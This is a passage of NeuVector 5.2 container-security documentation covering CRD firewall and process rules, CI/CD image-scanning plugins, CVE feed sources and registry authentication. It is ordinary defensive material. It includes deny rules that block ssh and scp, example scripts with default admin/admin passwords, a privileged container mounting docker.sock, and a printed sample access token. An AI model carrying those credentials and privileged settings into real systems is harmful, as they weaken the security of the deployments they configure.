yet exist in the destination environment, and the currently used Kubernetes user-context has the necessary permissions to access the namespaces configured in the CRD-yaml file to be imported.If the imported group exists in the destination system with different criteria or values, the import will be rejected.If the imported group exists in the destination system with identical configurations, we will reuse the existing group with different type.  ","version":"5.2","tagName":"h3"},{"title":"CRD Samples for Global Rules​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#crd-samples-for-global-rules","content":" The sample CRD below has two parts:  The first part is a NvClusterSecurityRule for the group named containers: The target for this NvClusterSecurityRule is all containers. It has an ingress policy that does not allow any external connections (outside your cluster) to ssh into your containers. It also denies all containers from using the ssh process. This defined global behavior applies to all containers. The second part is a NvSecurityRule for alpine services: The target is a service called nv.alpine.default in the 'default' namespace. Because it belongs to the all containers, it will inherit the above network policy and process rule. It also adds rules that don't not allow connections of HTTP traffic through port 80 to an external network. Also it not allow the running of the scp process.  Note that for service nv.alpine.default (defined as nv.xxx.yyy where xxx is the service name like alpine, yyy is the namespace like default) we can define policy mode that it is set to. Here it is defined as Protect mode (blocking all abnormal activity).  Overall since nv.alpine.defult is in protect mode, it will deny containers from running ssh and scp, and also will deny ssh connections from external or http to external.  If you change the nv.alpine.defult policymode to monitor, then NeuVector will just log it when scp/ssh is invoked, or there are ssh connections from external or http to external.  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: containers namespace: default spec: egress: [] file: [] ingress: - selector: criteria: [] name: external action: deny applications: - SSH name: containers-ingress-0 ports: tcp/22 process: - action: deny name: ssh path: /bin/ssh target: selector: criteria: - key: container op: = value: '*' name: containers policymode: null - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.alpine.default namespace: default spec: egress: - selector: criteria: [] name: external action: deny applications: - HTTP name: external-egress-0 ports: tcp/80 file: [] ingress: [] process: - action: deny name: scp path: /bin/scp target: selector: criteria: - key: service op: = value: alpine.default - key: domain op: = value: default name: nv.alpine.default policymode: Protect kind: List metadata: null   To allow, or whitelist a process such as a monitoring process to run, just add a process rule with action: allow for the process name, and add the path. The path must be specified for allow rules but is optional for deny rules.  ","version":"5.2","tagName":"h3"},{"title":"Updating CRD Rules and Adding to Existing Groups​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#updating-crd-rules-and-adding-to-existing-groups","content":" Updating the CRD generated rules in NeuVector is as simple as updating the appropriate yaml file and applying the update:  kubectl apply -f &lt;crdrule.yaml&gt;   Dynamic criteria support for NvClusterSecurityRule​  Multiple CRDs which change the criteria for existing custom group(s) are supported. This feature also allows the user to apply multiple CRDs at once, where the NeuVector behavior is to accept and queue the CRD so the immediate response to the user is always success. During processing, any errors are reported into the console Notifications -&gt; Events. ","version":"5.2","tagName":"h3"},{"title":"Build Phase Image Scanning","type":0,"sectionRef":"#","url":"/5.2/scanning/build","content":"","keywords":"","version":"5.2"},{"title":"CI/CD Build Phase Vulnerability Scanning​","type":1,"pageTitle":"Build Phase Image Scanning","url":"/5.2/scanning/build#cicd-build-phase-vulnerability-scanning","content":" Scan for vulnerabilities during the build phase of the pipeline using plug-ins such as Jenkins, Azure Devops, Github Action, gitlab, Bamboo, and CircleCI, or use the REST API. NeuVector supports two types of build-phase scanning: registry and local. For registry scanning, the NeuVector controller and scanner must be able to connect to the registry to pull the image.  To trigger a build-phase scan, the plug-in (e.g. Jenkins) must be able to connect to the Controller or Allinone. Note: The default REST API port for plug-ins to call the scanner is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  Make sure there is a NeuVector scanner container deployed and properly configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separately from the allinone or controller, and is included in the sample deployment yaml files.  You can download the plug-in from the Jenkins Plug-in Manager. Other plug-ins are accessible through the catalogs of the build tool, or on the NeuVector github page. The Bamboo scanner is available at https://github.com/neuvector/bamboo-plugin/releases/tag/1.0.1. The CircleCI ORB is available at https://github.com/neuvector/circleci-orb and through the CircleCI ORB catalog.  Local Build-Phase Scanning​  For local scanning, the NeuVector scanner will try to scan the image on a local host (or a host reachable by the remote host docker command).  For Kubernetes or OpenShift-based local scanning, remove the commented-out section of the sample scanner deployment yaml file, shown in the Deploying NeuVector sections. The commented out section looks like this:   env: # Commented out sections are required only for local build-phase scanning # - name: SCANNER_DOCKER_URL # value: tcp://192.168.1.10:2376 - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP # volumeMounts: # - mountPath: /var/run/docker.sock # name: docker-sock # readOnly: true # volumes: # - name: docker-sock # hostPath: # path: /var/run/docker.sock restartPolicy: Always   For Docker-native local scanning, follow the instructions for Docker scanner deployments in the Docker Production deployments section for the scanner.  Local Build-Phase Scanning - Scanner Only (No Controller Required)​  NeuVector supports standalone scanner deployments for local image scanning (which does not require a Controller). Certain plug-in's such as the CircleCI ORB have an option to dynamically deploy a scanner when a build job requires image scanning, then remove the scanner when the results are sent back through the ORB. These dynamic scanner deployments are automatically invoked through the plug-in if supported.  Please see the scanner section for more details on stand alone scanners. ","version":"5.2","tagName":"h3"},{"title":"Azure DevOps","type":0,"sectionRef":"#","url":"/5.2/scanning/build/azuredevops","content":"","keywords":"","version":"5.2"},{"title":"Scan for Vulnerabilities in the Azure DevOps Build Pipeline​","type":1,"pageTitle":"Azure DevOps","url":"/5.2/scanning/build/azuredevops#scan-for-vulnerabilities-in-the-azure-devops-build-pipeline","content":" The NeuVector scanner can be triggered from the Azure DevOps pipeline by using the NeuVector extension published in the Azure DevOps Marketplace.    The extension supports both remote and local scanning where the NeuVector controller can remotely scan an image in a registry during the build, or dynamically start a local controller to scan the image on the Azure agent vm.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Scan image with NeuVector task integrates the NeuVector vulnerability scanner into an Azure DevOps Pipeline.Perform vulnerability scans of a container image after the image build on an external NeuVector controller instance or on a local NeuVector controller instance which is running in service container inside a pipeline.Define thresholds for failing builds based on the number of detected vulnerabilities of different severities.Provide a detailed report of an image scan for analysis in the build summary tab.External NeuVector controller instances are defined as service endpoints to decouple build pipeline definitions from connection parameters and credentials.  An overview with sample screens can be found at https://marketplace.visualstudio.com/items?itemName=NeuVector.neuvector-vsts ","version":"5.2","tagName":"h3"},{"title":"Bamboo","type":0,"sectionRef":"#","url":"/5.2/scanning/build/bamboo","content":"","keywords":"","version":"5.2"},{"title":"Scan for Vulnerabilities during Bamboo Build Pipeline​","type":1,"pageTitle":"Bamboo","url":"/5.2/scanning/build/bamboo#scan-for-vulnerabilities-during-bamboo-build-pipeline","content":" The Bamboo plug-in for NeuVector can be used to scan for vulnerabilities in the Bamboo pipeline. The plug-in can be downloaded from the Admin -&gt; Add-ons menu in Bamboo. Use Find New Apps to search for NeuVector. The plug-in is also described in the Atlassian Marketplace.  Deploy the NeuVector Allinone or Controller container if you haven't already done so on a host reachable by Bamboo. Make a note of the IP address of the host where the Allinone or Controller is running.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Configure Global Settings​  Configure settings for the NeuVector Controller/Allinone including the NeuVector authentication as well as the registry authentication.  Configure the Repository and Build Policy​  Create a task and enter the repository and tag to scan as well as the build policy to fail the build if vulnerabilities are detected. Enable layered scanning if the results should contain an analysis of vulnerabilities for each layer in the image.  Review Results​  Review the results in the scan logs, including the scan summary, reason for failing if appropriate, and details for each CVE detected. ","version":"5.2","tagName":"h3"},{"title":"GitHub","type":0,"sectionRef":"#","url":"/5.2/scanning/build/github","content":"","keywords":"","version":"5.2"},{"title":"Scan for Vulnerabilities in a GitHub Action Pipeline​","type":1,"pageTitle":"GitHub","url":"/5.2/scanning/build/github#scan-for-vulnerabilities-in-a-github-action-pipeline","content":" The NeuVector scanner can be triggered from a GitHub Action pipeline by using the NeuVector Vulnerability Scan Actionpublished in the GitHub Action Marketplace.   ","version":"5.2","tagName":"h3"},{"title":"CircleCI","type":0,"sectionRef":"#","url":"/5.2/scanning/build/circleci","content":"","keywords":"","version":"5.2"},{"title":"Scan for Vulnerabilities in the CircleCI Build Pipeline​","type":1,"pageTitle":"CircleCI","url":"/5.2/scanning/build/circleci#scan-for-vulnerabilities-in-the-circleci-build-pipeline","content":" The NeuVector CircleCI ORB triggers a vulnerability scan on an image in the CircleCI pipeline. The ORB is available in the CircleCI catalog and is also documented on the NeuVector GitHub page.  Deploy the NeuVector Allinone or Controller container if you haven't already done so on a host reachable by the CircleCI ORB. Make a note of the IP address of the host where the Allinone or Controller is running.  The ORB supports two use cases:  Triggering the scan to be performed outside the CirclCI infrastructure. The ORB contacts the NeuVector scanner, which then pulls the image from a registry to be scanned. Make sure the ORB has network connectivity to the host where the NeuVector Controller/Allinone is running.Dynamically launching a NeuVector controller and scanner on a temporary vm running on the CircleCI platform. After launching and auto-configuring, the scan be done on image in the build, and after completion the NeuVector deployment is stopped and removed. For this use case, please see the documentation on the CircleCI ORB for NeuVector.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Create a Context in Your CircleCI App​    Configure Settings​  Configure the Environment Variables for Connecting to and Authenticating    Add the NeuVector orb to Your Build config.yaml  version: 2.1 orbs: neuvector: neuvector/neuvector-orb@1.0.0 workflows: scan-image: jobs: - neuvector/scan-image: context: myContext registry_url: https://registry.hub.docker.com repository: alpine tag: &quot;3.4&quot; scan_layers: false high_vul_to_fail: 0 medium_vul_to_fail: 3   The registry_url is the location to find the image to be scanned. Configure the repository name, tag, and if a layered scan should be performed. Add criteria for the build task to fail based on number of high or medium vulnerabilities detected.  Review the Results​  The build task will pass or fail based on the criteria set. In either case you can review the full scan report. ","version":"5.2","tagName":"h3"},{"title":"CVE Database Sources & Version","type":0,"sectionRef":"#","url":"/5.2/scanning/cve_sources","content":"","keywords":"","version":"5.2"},{"title":"NeuVector Vulnerability (CVE) Database​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/5.2/scanning/cve_sources#neuvector-vulnerability-cve-database","content":" The NeuVector vulnerability database is updated nightly with sources from popular container base images and package providers. These updates are automatically built into the updater container and published to the NeuVector private docker hub registry. The list of sources included is evaluated frequently to ensure the accuracy of scan results.  note You control when to update the CVE database in your deployment. Please see the section Updating the CVE Database for details on how to update.  important NeuVector is able to scan distroless and PhotonOS based images.  ","version":"5.2","tagName":"h3"},{"title":"CVE Database Version​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/5.2/scanning/cve_sources#cve-database-version","content":" The CVE database version and date can be seen in the console in the Platforms, Registries, Vulnerabilities tab in Containers/Nodes in Assets, and Risk Reports Scan Events.  To use the REST API to query the version:  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://127.0.0.1:10443/v1/scan/scanner&quot;   Output:  { &quot;scanners&quot;: [ { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;0f043705948557828ac1831ee596588a0d050950113117ddd19ecd604982f4d9&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;127.0.0.1&quot; }, { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;9fa02c644d603f59331c95735158d137002d32a75ed1014326f5039f38d4d717&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;192.168.9.95&quot; } ] }   To query the NeuVector scanner for the database version:  kubectl exec &lt;scanner pod&gt; -n neuvector -- scanner -v -d /etc/neuvector/db/   To use docker commands:  docker exec scanner scanner -v -d /etc/neuvector/db/   ","version":"5.2","tagName":"h3"},{"title":"Querying the CVE Database for Specific CVE Existence​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/5.2/scanning/cve_sources#querying-the-cve-database-for-specific-cve-existence","content":" An online service is provided for NeuVector Prime (paid subscription) customers to be able to query the CVE database to determine if a specific CVE exists in the current database version. Other CVE database queries are also available from this service. Please request access through your SUSE Support portal (SCC), SUSE Collective link, or contact your SUSE account representative to access this service.  ","version":"5.2","tagName":"h3"},{"title":"CVE Database Sources​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/5.2/scanning/cve_sources#cve-database-sources","content":" The most up-to-date list of CVE database sources can be found here  Sources include:  General CVE Feeds​  Source\tURLnvd and Mitre\thttps://nvd.nist.gov/feeds/json/cve/1.1  note NVD is a superset of CVE https://cve.mitre.org/about/cve_and_nvd_relationship.html  OS CVE Feeds​  Source\tURLalpine\thttps://secdb.alpinelinux.org/ amazon\thttps://alas.aws.amazon.com/ debian\thttps://security-tracker.debian.org/tracker/data/json Microsoft mariner\thttps://github.com/microsoft/CBL-MarinerVulnerabilityData Oracle\thttps://linux.oracle.com/oval/ Rancher OS\thttps://rancher.com/docs/os/v1.x/en/about/security/ redhat\thttps://www.redhat.com/security/data/oval/v2/ SUSE linux\thttps://ftp.suse.com/pub/projects/security/oval/ ubuntu\thttps://launchpad.net/ubuntu-cve-tracker  Application Based Feeds​  Source\tURL.NET\thttps://github.com/advisories, https://www.cvedetails.com/vulnerability-list/vendor_id-26/ apache\thttps://www.cvedetails.com/vendor/45/Apache.html busybox\thttps://www.cvedetails.com/vulnerability-list/vendor_id-4282/Busybox.html golang\thttps://github.com/advisories java\thttps://openjdk.java.net/groups/vulnerability/advisories/ github maven\thttps://github.com/advisories?query=maven kubernetes\thttps://kubernetes.io/docs/reference/issues-security/official-cve-feed/ nginx\thttp://nginx.org/en/security_advisories.html npm/nodejs\thttps://github.com/advisories?query=ecosystem%3Anpm python\thttps://github.com/pyupio/safety-db openssl\thttps://www.openssl.org/news/vulnerabilities.html ruby\thttps://github.com/rubysec/ruby-advisory-db  ","version":"5.2","tagName":"h3"},{"title":"Scanner Accuracy​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/5.2/scanning/cve_sources#scanner-accuracy","content":" NeuVector evaluates each source to determine how to most accurately scan for vulnerabilities. It is common for scan results from different vendors' scanners to return different results. This is because each vendor processes the sources differently.  A higher number of vulnerabilities detected by one scanner is not necessarily better than another. This is because there can be false positives which return inaccurate vulnerability results.  NeuVector supports both layered and non-layered (compacted) scan results for images. The layered scan shows vulnerabilities in each layer, while the non-layered shows only vulnerabilities at the surface.  ","version":"5.2","tagName":"h3"},{"title":"Scanner Performance​","type":1,"pageTitle":"CVE Database Sources & Version","url":"/5.2/scanning/cve_sources#scanner-performance","content":" A number of factors determine scanner performance. For registry scanning, the number and size of images as well as if a layered scan is being performed will determine performance. For run-time scans, the collection of container data is distributed across all Enforcers, then scheduled by the Controller for database comparison.  Multiple parallel scanners can be deployed to increase scan performance for a large number of images. The controller will schedule scan tasks across all scanners. Each scanner is a container which is deployed by a Kubernetes deployment/replicaset. ","version":"5.2","tagName":"h3"},{"title":"Gitlab","type":0,"sectionRef":"#","url":"/5.2/scanning/build/gitlab","content":"","keywords":"","version":"5.2"},{"title":"Scan for Vulnerabilities during Gitlab Build Pipeline​","type":1,"pageTitle":"Gitlab","url":"/5.2/scanning/build/gitlab#scan-for-vulnerabilities-during-gitlab-build-pipeline","content":" NeuVector can be configured to scan for vulnerabilities triggered in the Gitlab build pipeline. There is a Gitlab plug-in here which can be configured and used. Please follow the instructions on the gitlab site for using the plugin.  The scan can also use the NeuVector REST API by configuring the provided script below to access the controller.  In addition, make sure there is a NeuVector scanner container deployed and configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separate from the allinone or controller.  Scan During Gitlab Build Using REST API​  Use the following script, configured for your NeuVector login credentials to trigger the vulnerability scans.  ######################## # Scanning Job ######################## NeuVector_Scan: image: docker:latest stage: test #the runner tag name is nv-scan tags: - nv-scan services: - docker:dind before_script: - apk add curl - apk add jq variables: DOCKER_DAEMON_PORT: 2376 DOCKER_HOST: &quot;tcp://$CI_SERVER_HOST:$DOCKER_DAEMON_PORT&quot; #the name of the image to be scanned NV_TO_BE_SCANNED_IMAGE_NAME: &quot;nv_demo&quot; #the tag of the image to be scanned NV_TO_BE_SCANNED_IMAGE_TAG: &quot;latest&quot; #for local, set NV_REGISTRY=&quot;&quot; #for remote, set NV_REGISTRY=&quot;[registry URL]&quot; NV_REGISTRY_NAME: &quot;&quot; #the credential to login to the docker registry NV_REGISTRY_USER: &quot;&quot; NV_REGISTRY_PASSWORD: &quot;&quot; #NeuVector image location NV_IMAGE: &quot;10.1.127.3:5000/neuvector/controller&quot; NV_PORT: 10443 NV_LOGIN_USER: &quot;admin&quot; NV_LOGIN_PASSWORD: &quot;admin&quot; NV_LOGIN_JSON: '{&quot;password&quot;:{&quot;username&quot;:&quot;$NV_LOGIN_USER&quot;,&quot;password&quot;:&quot;$NV_LOGIN_PASSWORD&quot;}}' NV_SCANNING_JSON: '{&quot;request&quot;:{&quot;registry&quot;:&quot;$NV_REGISTRY&quot;,&quot;username&quot;:&quot;$NV_REGISTRY_NAME&quot;,&quot;password&quot;:&quot;$NV_REGISTRY_PASSWORD&quot;,&quot;repository&quot;:&quot;$NV_TO_BE_SCANNED_IMAGE_NAME&quot;,&quot;tag&quot;:&quot;$NV_TO_BE_SCANNED_IMAGE_TAG&quot;}}' NV_API_AUTH_URL: &quot;https://$CI_SERVER_HOST:$NV_PORT/v1/auth&quot; NV_API_SCANNING_URL: &quot;https://$CI_SERVER_HOST:$NV_PORT/v1/scan/repository&quot; script: - echo &quot;Start neuvector scanner&quot; - docker run -itd --privileged --name neuvector.controller -e CLUSTER_JOIN_ADDR=$CI_SERVER_HOST -p 18301:18301 -p 18301:18301/udp -p 18300:18300 -p 18400:18400 -p $NV_PORT:$NV_PORT -v /var/neuvector:/var/neuvector -v /var/run/docker.sock:/var/run/docker.sock -v /proc:/host/proc:ro -v /sys/fs/cgroup/:/host/cgroup/:ro $NV_IMAGE - | _COUNTER_=&quot;0&quot; while [ -z &quot;$TOKEN&quot; -a &quot;$_COUNTER_&quot; != &quot;12&quot; ]; do _COUNTER_=$((( _COUNTER_ + 1 ))) sleep 5 TOKEN=`(curl -s -f $NV_API_AUTH_URL -k -H &quot;Content-Type:application/json&quot; -d $NV_LOGIN_JSON || echo null) | jq -r '.token.token'` if [ &quot;$TOKEN&quot; = &quot;null&quot; ]; then TOKEN=&quot;&quot; fi done - echo &quot;Scanning ...&quot; - sleep 20 - curl $NV_API_SCANNING_URL -s -k -H &quot;Content-Type:application/json&quot; -H &quot;X-Auth-Token:$TOKEN&quot; -d $NV_SCANNING_JSON | jq . - echo &quot;Logout&quot; - curl $NV_API_AUTH_URL -k -X 'DELETE' -H &quot;Content-Type:application/json&quot; -H &quot;X-Auth-Token:$TOKEN&quot; after_script: - docker stop neuvector.controller - docker rm neuvector.controller  ","version":"5.2","tagName":"h3"},{"title":"Jenkins Details","type":0,"sectionRef":"#","url":"/5.2/scanning/build/jenkins","content":"","keywords":"","version":"5.2"},{"title":"Detailed Configuration for the Jenkins Plugin​","type":1,"pageTitle":"Jenkins Details","url":"/5.2/scanning/build/jenkins#detailed-configuration-for-the-jenkins-plugin","content":" Containers provide an easy and efficient way to deploy applications. But container images may contain open source code over which you don't have a full control. Many vulnerabilities in open source projects have been reported, and you may decide to use these libraries with vulnerabilities or not after scanning the images and reviewing the vulnerability information for them.  The NeuVector Vulnerability Scanner Jenkins plugin can scan the images after your image is built in Jenkins. The plug-in source and latest documentation can be found here on the NeuVector GitHub page.  The plug-in supports two scan modes. The first is &quot;Controller &amp; Scanner&quot; mode. The second is the standalone scanner mode. You can select the scan mode in the project configuration page. By default, it uses the &quot;Controller &amp; Scanner&quot; mode.  For the &quot;Controller &amp; Scanner&quot; mode, you need to deploy the NeuVector controller and scanner in the network. To scan the local image (the image on the Jenkins machine), the &quot;Controller &amp; Scanner&quot; needs to be installed on the same node where the image exists.  For the standalone scanner mode, the Docker run-time must be installed on the same host with Jenkins. Also, add the jenkins user to the docker group.  sudo usermod -aG docker jenkins   Jenkins Plugin Installation​  First, go to Jenkins in your browser to search for the NeuVector plug-in. This can be found in:  -&gt; Manage Jenkins -&gt; Manage Plugins -&gt; Available -&gt; filter -&gt; search NeuVector Vulnerability Scanner -&gt;  Select it and click `install without restart.'  Deploy the NeuVector Controller and Scanner container if you haven't already done so on a host reachable by the Jenkins server. This can be on the same server as Jenkins if desired. Make a note of the IP address of the host where the Controller is running. Note: The default REST API port is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  In addition, make sure there is a NeuVector scanner container deployed standalone and configured to connect to the Controller (if Controller is being used).  There are two scenarios for image scanning, local and registry scanning.  Local Image Scan. If you use the plugin to scan local images (before pushing to any registries), you can scan on the same host as the controller/scanner or configure the scanner to access the docker engine on a remote host.Registry Image Scan. If you use the plugin to scan registry images (after pushing to any registries, but as part of the Jenkins build process), the NeuVector Scanner can be installed on any node in the network with connectivity between the registry, NeuVector Scanner, and Jenkins.  Global Configuration in Jenkins​  After installing the plugin, find the ‘NeuVector Vulnerability Scanner’ section in the global configuration page (Jenkins ‘Configure System’). Enter values for the NeuVector Controller IP, port, username, and password. You may click the ‘Test Connection’ button to validate the values. It will show ‘Connection Success’ or an error message.  The timeout minutes value will terminate the build step within the time entered. The default value of 0 means no timeout will occur.  Click the ‘Add Registry’ to enter values for the registry you will use in your project. If you will be only scanning local images, you don’t need to add a registry here.  Scenario 1: global configuration example for local image scan    Scenario 2: global configuration example for registry image scan  For global registry configuration, follow the instructions above for local, then add the registry details as below.    Standalone Scanner​  Running Jenkins scan in standalone mode is a lightweight way to scan image vulnerabilities in the pipeline. Scanner is dynamically invoked and no installaton of controller setup is required. This is especially useful when scaning an image before it is pushed to a registry. It also has no limit on how many scan tasks can run at the same time.  In order to run vulnerability scan in standalone mode, the Jenkins plugin need pull the scanner image to the host where the agent is running, so you need enter NeuVector Scanner registry URL, image repository, and the credential if needed, in NeuVector plugin configuration page.  The scan result can also be submitted to the controler and used in the admission control function. In this case, you do need a controller setup and specify how to connect to the controller in NeuVector plugin configuration page.  Local Configuration for scanning a remote Docker Host​  Prerequisites for Local Scan on a Remote Docker HostTo enable NeuVector to scan an image that is not on the same host as the controller/allinone:  Make sure the docker run-time api socket is exposed via TCPAdd the following environment variable to the controller/allinone: SCANNER_DOCKER_URL=tcp://192.168.1.10:2376  Project Configuration​  In your project, choose the 'NeuVector Vulnerability Scanner' plugin from the drop down menu in the 'Add build step.' Check the box &quot;Scan with Standalone scanner&quot; if you want to do the scan in the standalone scanner mode. By default, it uses &quot;Controller &amp; Scanner&quot; mode to do the scan.  Choose Local or a registry name which is the nickname you entered in global config. Enter the repository and image tag name to be scanned. You may choose Jenkins default environment variables for the repository or tag, e.g. $JOB_NAME, $BUILD_TAG, $BUILD_NUMBER. Enter the values for the number of high or medium, and for any name of the vulnerabilities present to fail the build.  After the build is finished, a NeuVector report will be generated. It will show the scan details and errors if any.  Scenario 1: local configuration example    Scenario 2: registry configuration example    Jenkins Pipeline​  For the Jenkins pipeline project, you may write your own pipeline script directly, or click the ‘pipeline syntax’ to generate the script if you are new to the pipeline style task.    Select the NeuVector Vulnerability Scanner from the drop-down, configure it, and Generate the script.    Copy the script into your Jenkins task script.  Scenario 1: Simple local pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'Local', repository: 'your_username/your_image' \\} ...   Scenario 2: Simple registry pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'your_registry', repository: 'your_username/your_image' \\} ...   Additional Stages​  Add your own pre- and post- image scan stages, for example in the Pipeline stage view example below.    You are now ready to start your Jenkins builds and trigger the NeuVector Vulnerability Scanner to report any vulnerabilities!  ","version":"5.2","tagName":"h3"},{"title":"OpenShift Route and Registry Token Example​","type":1,"pageTitle":"Jenkins Details","url":"/5.2/scanning/build/jenkins#openshift-route-and-registry-token-example","content":" To configure the plug-in using an OpenShift route for ingress to the controller, add the route into the controller IP field.    To use token based authentication to the OpenShift registry, use NONAME as the user and enter the token in the password.  ","version":"5.2","tagName":"h3"},{"title":"Special Use Case for Jenkins in the Same Kubernetes Cluster​","type":1,"pageTitle":"Jenkins Details","url":"/5.2/scanning/build/jenkins#special-use-case-for-jenkins-in-the-same-kubernetes-cluster","content":" To do build-phase scanning where the Jenkins software is running in the same Kubernetes cluster as the scanner, make sure the scanner and Jenkins are set to run on the same node. The node needs to be labeled so the Jenkins and scanner containers run on the same node because the scanner needs access to the local node's docker.sock to access the image. ","version":"5.2","tagName":"h3"},{"title":"ECR Scanning using IAM Roles","type":0,"sectionRef":"#","url":"/5.2/scanning/registry/ecr-iam","content":"","keywords":"","version":"5.2"},{"title":"AWS ECR - IAM Roles​","type":1,"pageTitle":"ECR Scanning using IAM Roles","url":"/5.2/scanning/registry/ecr-iam#aws-ecr---iam-roles","content":" When the NeuVector containers are deployed in AWS, and an EC2 instance is assigned a role of “EC2 Container Registry” Read Access, the AWS ECR registry can be scanned without an Access Key and Secret Key.  Here is how to create an AWS role and assign it to the node.  Select the Instance​  Note that the IAM role is either blank or does not include the ECR role    Attach a Role​  Select Actions -&gt; Instance Settings -&gt; Attach/Replace IAM Role    If you have not previously created the ECR role, click Create New IAM Role. Enter the role name.    Select the AWS Service​    List of Roles​    Attach the ECR Read Permission to the Role​    Review Your Settings​    Check the Instance for IAM Role​   ","version":"5.2","tagName":"h3"},{"title":"GCR Scanning using Service Accounts","type":0,"sectionRef":"#","url":"/5.2/scanning/registry/gcr-sa","content":"","keywords":"","version":"5.2"},{"title":"Google GCR - Authentication/Scanning with GCP Service Accounts​","type":1,"pageTitle":"GCR Scanning using Service Accounts","url":"/5.2/scanning/registry/gcr-sa#google-gcr---authenticationscanning-with-gcp-service-accounts","content":" It is a best practice to not depend on user attributed accounts for integrations. GCP supports using a service account to access GCR. Here are the steps to enable a service account for GCR and use it to trigger repository scans from NeuVector.  Start in NeuVector, where one first sets up a new registry:    By selecting Google Container Registry as the repo type, this panel is customized to accept the input required to use your GCR.  Name - Here’s where you give this particular repo entry a name of your choosing. It’s merely to identify it in the NeuVector interface later on.Registry - This is the first place where you’ll want to be sure the correct data is collected from your GCR instance. While the example of https://gcr.io is the most common, we will want to be sure it accurately reflects how your GCR was set up in GCP. It might be https://us.gcr.io for example. We’ll go check it in the next section.JSON Key - As is pretty self-evident, this will be a JSON-formatted key. And, as you’re probably seeing a pattern set up for, we’ll be finding that via GCP.Filter - Be mindful that you will likely need to replace any filters here with the actual name of the repo. Again, that’s in the GCR interface.   Now let’s head on over to that GCR screen in GCP. Much of what we need is right here on this page.  A. See the “gcr.io” under Hostname? That’s what belongs in item #2, Registry in the NeuVector interface. (Don’t forget the https:// part) B. The ID of the repo is actually under the top level project. This is what you will be using in #3, Filter. See example of env-demo below.    The JSON Key leads us to explore another very important step, and that takes us to the IAM &amp; Admin section of GCP where we will create (or confirm the setting of) a Service Account. See below:    Once you enter the data for the first step of creating a service account, you need to press the “CREATE” button to get step 2 to be willing to accept input.    Be sure to select Basic —&gt; Viewer for the access. If you have an existing service account, ensure that the access is set this way. (Hint: Even access permissions that appear to be more powerful don’t seem to allow for proper access. Don't skip this step.  Once you’ve done this step, you can breeze past Step 3 and proceed with creating the Service Account.  If you don’t immediately land on the info panel for your new service account, be sure to go there on the Service Accounts list. See figure 5 below.    Click “ADD KEY” —&gt; “Create New Key”    As you have already concluded, JSON is the go-to here. Selecting “CREATE” will result in a file that you can download in your browser. The contents of this file should be pasted into the 3, JSON Key field in NeuVector; see figure 1.  Before you get too excited there’s one more thing to ensure. In order for the scanner in NeuVector to use the API to scan and protect your images, said API must be enabled in your GCP account. You can either enable it via the command line via  gcloud services enable artifactregistry.googleapis.com   Or you can use the GCP gui. Head to “API Library” and search for “Artifact Registry API” and ensure it is turned on for your project. See figure 7.    You should be set! See figure 8 below for a properly-configured registry using the data from our example:    Obtain the Access Token Using the REST API​  The NeuVector REST API may be used to authenticate using the service account. The below example uses gcloud to obtain the access token. The username is “oauth2accesstoken”.  gcloud auth print-access-token ya29.a0AfH6SMAvyZ2zkD3MZD_K8Lqr7qkIsRkGNqhAGthJ_A7lp8OGRe7xh5KmuQY-VJfqu83C9e1gi7A_m1InNm8QIoTGf9WHXnOeAr1gT_O6b6K667NUz1_YDunjdW09jt0XvcBGQaxjJ3c4aHlxdehBFiE_9PMk13JDt_T6f0_6vzS7   Use the Token with NeuVector Repository Scanning​  The below example script incorporates the access token to trigger GCR repository scan.  _curCase_=`echo $0 | awk -F&quot;.&quot; '{print $(NF-1)}' | awk -F&quot;/&quot; '{print $NF}'` _DESC_=&quot;able to scan ubuntu:16.04 image&quot; _ERRCODE_=0 _ERRTYPE_=1 _RESULT_=&quot;pass&quot; # please remember to specify the controller ip address here _controllerIP_=&quot;10.1.24.252&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot; _registryURL_=&quot;https://us.gcr.io/&quot; # registry urls could also be gcr.io, eu.gcr.io, asia.gcr.io etc _registryUsername_=&quot;oauth2accesstoken&quot; _registryPassword_=$(gcloud auth print-access-token) _repository_=&quot;bionic-union-271100/alpine&quot; _tag_=&quot;latest&quot; curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, 